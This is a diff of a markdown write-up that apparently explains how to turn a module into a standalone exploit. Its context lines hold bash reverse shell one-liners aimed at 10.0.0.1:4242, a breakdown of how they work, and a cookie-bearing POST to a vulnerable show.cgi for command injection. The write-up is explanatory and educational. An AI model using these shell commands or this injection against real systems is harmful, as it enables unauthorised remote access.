@@ -454,7 +454,6 @@ bash -i >& dev/tcp/10.0.0.1/4242 0>&1
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 ```
 
-
 `bash -i` : Initiate the interactive shell, allowing for both inputs and outputs in the same terminal  
 `/dev/tcp/10.0.0.1/4242` : special file in linux which permits creation of a network connection, to the given IP and port.  
 `>& /dev/tcp/10.0.0.1/4242` : redirects `stdout` and `stderr` to the tcp connection
@@ -491,9 +490,9 @@ The module did not specify whether to use a POST or GET method however, in this 
 
 `req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`
 
-Conversion Requirements Met:
-  generate five random alphanumeric characters
-  store the system shell with a function, encode it and send it back via socket
+Conversion Requirements Met:  
+  generate five random alphanumeric characters  
+  store the system shell with a function, encode it and send it back via socket  
   send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command  
 
 ## Final Exploit and Test
